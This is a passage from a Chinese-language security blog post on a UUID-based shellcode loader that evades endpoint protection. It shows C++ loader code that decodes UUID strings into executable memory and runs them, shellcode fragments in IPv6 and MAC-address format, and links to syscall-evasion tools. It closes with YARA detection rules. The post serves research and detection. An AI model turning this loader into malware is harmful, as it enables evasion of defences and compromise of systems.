operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span><br>  <span class="token keyword">auto</span> len <span class="token operator">=</span> uuids<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">;</span><br>  <span class="token function">NtAllocateVirtualMemory</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&</span>exec<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&</span>len<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span><br>                          PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span><br>  DWORD_PTR hptr <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD_PTR<span class="token punctuation">)</span>exec<span class="token punctuation">;</span><br>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span><span class="token operator">&</span> uuid <span class="token operator">:</span> uuids<span class="token punctuation">)</span> <span class="token punctuation">{</span><br>    RPC_STATUS status <span class="token operator">=</span> <span class="token function">UuidFromStringA</span><span class="token punctuation">(</span><span class="token punctuation">(</span>RPC_CSTR<span class="token punctuation">)</span>uuid<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>UUID<span class="token operator">*</span><span class="token punctuation">)</span>hptr<span class="token punctuation">)</span><span class="token punctuation">;</span><br>    <span class="token keyword">if</span> <span class="token punctuation">(</span>status <span class="token operator">!=</span> RPC_S_OK<span class="token punctuation">)</span> <span class="token punctuation">{</span><br>      <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><br>    <span class="token punctuation">}</span><br>    hptr <span class="token operator">+=</span> <span class="token number">16</span><span class="token punctuation">;</span><br>  <span class="token punctuation">}</span><br>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>exec<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><br><span class="token punctuation">}</span></code></pre><p>下斷點可以看到 <code>UuidFromStringA</code> 還原後的 shellcode 在記憶體中</p><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/zet/uuid-shellcode/uuid-in-memory-1920w.webp 1920w, /img/posts/zet/uuid-shellcode/uuid-in-memory-1280w.webp 1280w, /img/posts/zet/uuid-shellcode/uuid-in-memory-840w.webp 840w, /img/posts/zet/uuid-shellcode/uuid-in-memory-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/zet/uuid-shellcode/uuid-in-memory-1920w.png 1920w, /img/posts/zet/uuid-shellcode/uuid-in-memory-1280w.png 1280w, /img/posts/zet/uuid-shellcode/uuid-in-memory-840w.png 840w, /img/posts/zet/uuid-shellcode/uuid-in-memory-320w.png 320w" type="image/png"><img alt="uuid decode in memory" src="/img/posts/zet/uuid-shellcode/uuid-in-memory-1920w.png" height="415" width="1387" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 1387 415'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAECAYAAAC+0w63AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAfklEQVQImU2NbQrDQAhE9zZJmur4ka0Lvf+5pkRa6I/B8fnA4RZc600geJ5C92TGpKpRnmgOOEXAbTu47w8ex8lRr6J70GCMyO6A9fzPzaoWq6q9kRE0A1WVZtYdAN29E+HN7/uPqQrHlddXCGYm55xca/Xeohk97o9oJiKdD7xyV7cMAdXQAAAAAElFTkSuQmCC'%3E%3C/image%3E%3C/svg%3E&#34;)"></picture></p><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/zet/uuid-shellcode/uuid-calc-1920w.webp 1920w, /img/posts/zet/uuid-shellcode/uuid-calc-1280w.webp 1280w, /img/posts/zet/uuid-shellcode/uuid-calc-840w.webp 840w, /img/posts/zet/uuid-shellcode/uuid-calc-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/zet/uuid-shellcode/uuid-calc-1920w.png 1920w, /img/posts/zet/uuid-shellcode/uuid-calc-1280w.png 1280w, /img/posts/zet/uuid-shellcode/uuid-calc-840w.png 840w, /img/posts/zet/uuid-shellcode/uuid-calc-320w.png 320w" type="image/png"><img alt="calc" src="/img/posts/zet/uuid-shellcode/uuid-calc-1920w.png" height="613" width="1093" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 1093 613'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAGCAYAAAD68A/GAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA10lEQVQImR2NPWqEYBiEP6xEyCoo68+CoKABz7BpLINgJQQVG8/gFSwXAilMGoskpAhptxL0ABtPYeEp8gQdeOAdZnhH5HlOVVWUZblTFAVJktA0DdfrlWEY6PseoaoqmqZxdzggy/KOEII4jhnHkWmaaNsW4fs+rutiWRbHo4lt23s5TVPmeeZ2+6XrOkQURXtoGAZheE8QBPvHLMtY15VlWfj8eEeEYYjjOJimyXZ7nockSdR1zaY/4Ov7B6Hr+j67cTo5bF5RFM7nB95eOy7PLzw+1fwD2dF2OH3IiRwAAAAASUVORK5CYII='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture></p><p>更多其他利用：</p><ul><li><a href="https://blog.sunggwanchoi.com/eng-uuid-shellcode-execution/" rel="noopener noreferrer" target="_blank">C# Dynamic-Invoke UUID shellcode Execution</a><ul><li><a href="https://thewover.github.io/Dynamic-Invoke/" rel="noopener noreferrer" target="_blank">Emulating Covert Operations - Dynamic Invocation (Avoiding PInvoke & API Hooks)</a></li><li><a href="https://github.com/TheWover/DInvoke" rel="noopener noreferrer" target="_blank">github DInvoke</a></li></ul></li><li><a href="https://github.com/boku7/Ninja_UUID_Runner" rel="noopener noreferrer" target="_blank">Ninja UUID Runner</a> 利用 HellsGate syscall 減少在 User mode 被檢測的風險</li><li><a href="http://ropgadget.com/posts/abusing_win_functions.html" rel="noopener noreferrer" target="_blank">native Windows functions for shellcode execution</a> 利用更多 windows native function callback 執行 shellcode</li><li><a href="https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection" rel="noopener noreferrer" target="_blank">Callback_Shellcode_Injection</a></li><li><a href="https://github.com/mai1zhi2/SysWhispers2_x86" rel="noopener noreferrer" target="_blank">x86 SysWhispers2</a> 支援 x86 的 SysWhispers2 (SysWhispers 只支援 64)</li><li><a href="https://github.com/icyguider/Shhhloader" rel="noopener noreferrer" target="_blank">SysWhispers Shellcode Loader</a></li><li><a href="https://jmpesp.me/malware-analysis-syscalls-example/" rel="noopener noreferrer" target="_blank">MALWARE ANALYSIS: SYSCALLS</a> 如何 debug 分析 direct syscall 的 malware</li></ul><p>更多其他 shellcode 格式 可以參考 <a href="https://github.com/midisec/BypassAnti-Virus/tree/main/callback" rel="noopener noreferrer" target="_blank">Midi Wan github</a>:</p><p>ipv6 format</p><pre class="language-diff"><code class="language-diff">"fc48:83e4:f0e8:c800:0:4151:4150:5251"<br>"5648:31d2:6548:8b52:6048:8b52:1848:8b52"<br>"2048:8b72:5048:fb7:4a4a:4d31:c948:31c0"<br>"ac3c:617c:22c:2041:c1c9:d41:1c1:e2ed"</code></pre><p>mac address format</p><pre class="language-diff"><code class="language-diff">"FC-48-83-E4-F0-E8",<br>"C8-00-00-00-41-51",<br>"41-50-52-51-56-48",<br>"31-D2-65-48-8B-52",<br>"60-48-8B-52-18-48",<br>"8B-52-20-48-8B-72"</code></pre><h2 id="%E5%81%B5%E6%B8%AC"><a href="#%E5%81%B5%E6%B8%AC" class="direct-link">#</a> 偵測</h2><p>利用 yara 寫些 patten，針對 POC 中主要使用的 API <code>UuidFromString</code> 加上 超過一定數量 UUID 的特徵簡單寫個 yara rule，也可以再加上 API <code>HeapAlloc</code> + <code>EnumSystemLocales</code></p><p>簡單的範例大概如下：</p><pre class="language-yml"><code class="language-yml">rule uuid_shellcode_loader <span class="token punctuation">{</span><br>    <span class="token atrule key">meta</span><span class="token punctuation">:</span><br>        description = "shellcode through UUID"<br>        date = "02/16/2022"<br>        author = "Zet"<br>    <span class="token atrule key">strings</span><span class="token punctuation">:</span><br>        $mz = "MZ"<br>        $a = "UuidFromString"<br>        $uuid = /<span class="token punctuation">[</span>0<span class="token punctuation">-</span>9a<span class="token punctuation">-</span>f<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token number">8</span><span class="token punctuation">}</span><span class="token punctuation">-</span><span class="token punctuation">[</span>0<span class="token punctuation">-</span>9a<span class="token punctuation">-</span>f<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">-</span><span class="token punctuation">[</span>0<span class="token punctuation">-</span>9a<span class="token punctuation">-</span>f<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">-</span><span class="token punctuation">[</span>0<span class="token punctuation">-</span>9a<span class="token punctuation">-</span>f<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">-</span><span class="token punctuation">[</span>0<span class="token punctuation">-</span>9a<span class="token punctuation">-</span>f<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token number">12</span><span class="token punctuation">}</span>/ ascii<br>    <span class="token atrule key">condition</span><span class="token punctuation">:</span><br>		$mz at 0<br>        and $a<br>        and (<span class="token comment">#uuid >7)</span><br><span class="token punctuation">}</span></code></pre><p>另外針對 syswhispers2 lib 我們可以針對產生出來的 ASM 檔寫一些規則，假如要在通用一點的話或許可以在研究 lib 中用於產生 <code>.h</code> <code>.c</code> 的 <a href="https://github.com/jthuraisamy/SysWhispers2/tree/main/data" rel="noopener noreferrer" target="_blank">base template</a> 寫規則</p><pre class="language-yml"><code class="language-yml">rule syswhispers2 <span class="token punctuation">{</span><br>    <span class="token atrule key">meta</span><span class="token punctuation">:</span><br>        description = "syswhispers2 <span class="token punctuation">-</span> direct system calls lib"<br>        date = "02/16/2022"<br>        author = "Zet"<br>    /*<br>    0x140002370 48894C2408                    mov qword ptr <span class="token punctuation">[</span>rsp + 8<span class="token punctuation">]</span><span class="token punctuation">,</span> rcx<br>    0x140002375 4889542410                    mov qword ptr <span class="token punctuation">[</span>rsp + 0x10<span class="token punctuation">]</span><span class="token punctuation">,</span> rdx<br>    0x14000237a 4C89442418                    mov qword ptr <span class="token punctuation">[</span>rsp + 0x18<span class="token punctuation">]</span><span class="token punctuation">,</span> r8<br>    0x14000237f 4C894C2420                    mov qword ptr <span class="token punctuation">[</span>rsp + 0x20<span class="token punctuation">]</span><span class="token punctuation">,</span> r9<br>    0x140002384 4883EC28                      sub rsp<span class="token punctuation">,</span> <span class="token number">0x28</span><br>    0x140002388 B91EC995DD                    mov ecx<span class="token punctuation">,</span> <span class="token number">0xdd95c91e</span><br>    0x14000238d E85EF1FFFF                    call 0x1400014f0<br>    0x140002392 4883C428                      add rsp<span class="token punctuation">,</span> <span class="token number">0x28</span><br>    0x140002396 488B4C2408                    mov rcx<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rsp + 8<span class="token punctuation">]</span><br>    0x14000239b 488B542410                    mov rdx<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rsp + 0x10<span class="token punctuation">]</span><br>    0x1400023a0 4C8B442418                    mov r8<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rsp + 0x18<span class="token punctuation">]</span><br>    0x1400023a5 4C8B4C2420                    mov r9<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rsp + 0x20<span class="token punctuation">]</span><br>    0x1400023aa 4C8BD1                        mov r10<span class="token punctuation">,</span> rcx<br>    0x1400023ad 0F05                          syscall<br>    0x1400023af C3                            ret<br>    <span class="token important">*/</span><br>    <span class="token atrule key">strings</span><span class="token punctuation">:</span><br>        $mz = "MZ"<br>        $s = <span class="token punctuation">{</span><br>            48 89 4C 24 08<br>            48 89 54 24 10<br>            4C 89 44 24 18<br>            4C 89 4C 24 20<br>            48 83 EC 28<br>            B9 <span class="token punctuation">?</span><span class="token punctuation">?</span> <span class="token punctuation">?</span><span class="token punctuation">?</span> <span class="token punctuation">?</span><span class="token punctuation">?</span> <span class="token punctuation">?</span><span class="token punctuation">?</span><br>            E8 <span class="token punctuation">?</span><span class="token punctuation">?</span> <span class="token punctuation">?</span><span class="token punctuation">?</span> <span class="token punctuation">?</span><span class="token punctuation">?</span> <span class="token punctuation">?</span><span class="token punctuation">?</span><br>            48 83 C4 28<br>            48 8B 4C 24 08<br>            48 8B 54 24 10<br>            4C 8B 44 24 18<br>            4C 8B 4C 24 20<br>            4C 8B D1<br>            0f 05<br>            c3<br>        <span class="token punctuation">}</span><br>    <span class="token atrule key">condition</span><span class="token punctuation">:</span><br>        $mz at 0<br>        and <span class="token comment">#s > 3</span><br><span class="token punctuation">}</span></code></pre><p>我們可以把 yara 上傳到 <a href="https://riskmitigation.ch/yara-scan/index.html" rel="noopener noreferrer" target="_blank">Yara Scan Service<br></a>找到一些相關手法的利用</p><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/zet/uuid-shellcode/hunt-1920w.webp 1920w, /img/posts/zet/uuid-shellcode/hunt-1280w.webp 1280w, /img/posts/zet/uuid-shellcode/hunt-840w.webp 840w, /img/posts/zet/uuid-shellcode/hunt-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/zet/uuid-shellcode/hunt-1920w.png 1920w, /img/posts/zet/uuid-shellcode/hunt-1280w.png 1280w, /img/posts/zet/uuid-shellcode/hunt-840w.png 840w, /img/posts/zet/uuid-shellcode/hunt-320w.png 320w" type="image/png"><img alt="hunt" src="/img/posts/zet/uuid-shellcode/hunt-1920w.png" height="753" width="1077" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 1077 753'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAGCAYAAAARx7TFAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAkklEQVQImT3MwQ7CIBAA0f7/P9rSZa2UAlsETfQyptZ4mNvkDb13xnFCfcSs4pxj0UBJlT039nxnOCYRJSzGbhURId7Sbzgbem9M04yIfaV5FlQra3wR1jdrfDO01hhHh/flOx3Soht565T0IG39lJwTrlfD9jvee9ZgWH5S8pOcHqd0uTjcVCiloqosWoih//sAuIrKXCVK3ZAAAAAASUVORK5CYII='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture></p><h2 id="references"><a href="#references" class="direct-link">#</a> References</h2><ul><li><a href="https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala" rel="noopener noreferrer" target="_blank">https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala</a></li><li><a href="https://lowery.tech/building-a-custom-shellcode-loader-with-syswhispers-to-utilise-direct-syscalls/" rel="noopener noreferrer" target="_blank">https://lowery.tech/building-a-custom-shellcode-loader-with-syswhispers-to-utilise-direct-syscalls/</a></li><li><a href="https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/" rel="noopener noreferrer" target="_blank">https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/</a></li><li><a href="https://captmeelo.com/redteam/maldev/2021/11/18/av-evasion-syswhisper.html" rel="noopener noreferrer" target="_blank">https://captmeelo.com/redteam/maldev/2021/11/18/av-evasion-syswhisper.html</a></li><li><a href="https://github.com/am0nsec/HellsGate" rel="noopener noreferrer" target="_blank">https://github.com/am0nsec/HellsGate</a></li></ul><div class="article-footer"><a href="https://tech-blog.cymetrics.io/posts/zet/uuid-shellcode-loader/" on-click="share"><img alt="Share" src="/img/icons/icon_external link hyperlink.svg" height="24" width="24">Share this post</a></div><div><p style="font-weight: bold;">Tag</p><div class="post-tags"><a href="/tags/shellcode/" class="post-tag">#shellcode</a> <a href="/tags/malware/" class="post-tag">#malware</a> <a href="/tags/yara/" class="post-tag">#yara</a></div><p style="font-weight: bold;">Recommendation</p><ol><li><a href="/posts/huli/defi-cream-finance-hacked/">DeFi 借貸協議 Cream finance 遭駭事件分析</a></li><li><a href="/posts/seadog007/supply-chain-attack/">Supply Chain Attack — 供應鏈攻擊是什麼？</a></li><li><a href="/posts/huli/defi-poly-network-hacked/">Poly Network 遭駭事件分析</a></li><li><a href="/posts/crystal/pwn-intro-2/">PWN 入門 - rop, gadget 是什麼？</a></li><li><a href="/posts/crystal/email-sec-theory/">關於 email security 的大小事 — 原理篇</a></li></ol></div><div class="article-author"><img alt="zet" src="/img/authors/zet_logo.jpeg" class="article-author__img" data-deopt="true"><div class="article-author__info"><div class="article-author__title">Author</div><div class="article-author__author"><a href="/posts/zet">zet</a></div><div class="article-author__intro"></div></div></div><p style="font-weight: bold;">Discussion(login required)</p><script async="" src="https://utteranc.es/client.js" crossorigin="anonymous" id="utterance-script" issue-term="title" label="utterance" repo="cymetrics/blog" theme="github-light"></script><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"跟端點防護軟體玩玩貓捉老鼠的遊戲 - Shellcode loader","image":["https://tech-blog.cymetrics.io/img/posts/zet/uuid-shellcode/uuid-format-1920w.png","https://tech-blog.cymetrics.io/img/posts/zet/uuid-shellcode/project-files-1920w.png","https://tech-blog.cymetrics.io/img/posts/zet/uuid-shellcode/uuid-in-memory-1920w.png","https://tech-blog.cymetrics.io/img/posts/zet/uuid-shellcode/uuid-calc-1920w.png","https://tech-blog.cymetrics.io/img/posts/zet/uuid-shellcode/hunt-1920w.png","https://tech-blog.cymetrics.io/img/icons/icon_external link hyperlink.svg","https://tech-blog.cymetrics.io/img/authors/zet_logo.jpeg"],"author":{"@type":"Person","name":"zet"},"publisher":{"@type":"Organization","name":"Cymetrics Tech Blog","url":"https://tech-blog.cymetrics.io","logo":{"@type":"ImageObject","url":"https://tech-blog.cymetrics.io/img/favicon/favicon-512x512.png","width":512,"height":512}},"url":"https://tech-blog.cymetrics.io/posts/zet/uuid-shellcode-loader/","mainEntityOfPage":"https://tech-blog.cymetrics.io/posts/zet/uuid-shellcode-loader/","datePublished":"2022-03-01","dateModified":"2023-09-13","description":"在資安世界的紅藍對抗像極了貓捉老鼠遊戲 紅隊 研究新穎攻擊手法，開發新工具，繞過偵測，長期維持權限 藍隊 研究偵測手法，從中偵測阻擋，從偵測點串起整個攻擊鏈 今天來玩玩 malware 針對端點防護軟體會用的一些手法，做個基於 direct system call 的 uuid..."}</script></article></main><footer><div class="footer-logos"><a href="https://www.facebook.com/cymetrics" rel="noopener noreferrer" target="_blank"><img alt="facebook" src="/img/icons/icon_social media_facebook.svg" height="30" width="30"></a><a href="https://www.linkedin.com/company/cymetrics" rel="noopener noreferrer" target="_blank"><img alt="linkedin" src="/img/icons/icon_social media_linkedln.svg" height="30" width="30"></a><a href="https://tech-blog.cymetrics.io/feed/feed.xml" rel="noreferrer noopener" target="_blank"><img alt="rss feed" src="/img/icons/rss-feed.svg" height="30" width="30"></a></div><div class="copyright">© 2021 Cymetrics Tech Blog, based on <a href="https://github.com/google/eleventy-high-performance-blog" rel="noopener noreferrer" target="_blank">eleventy-high-performance-blog</a>. <a href="https://oneinfinity.global/" rel="noopener noreferrer" target="_blank">OneInfinity</a></div></footer><script>// light/dark theme switch
      // disable dark mode for now
      const menuBtn = document.querySelector('.menu__btn')
      menuBtn.addEventListener('click', function() {
        document.querySelector('body').classList.toggle('lock')
        menuBtn.classList.toggle('menu__btn--close');
        document.querySelector('.nav__links').classList.toggle('nav__links--open')
      })</script></body></html>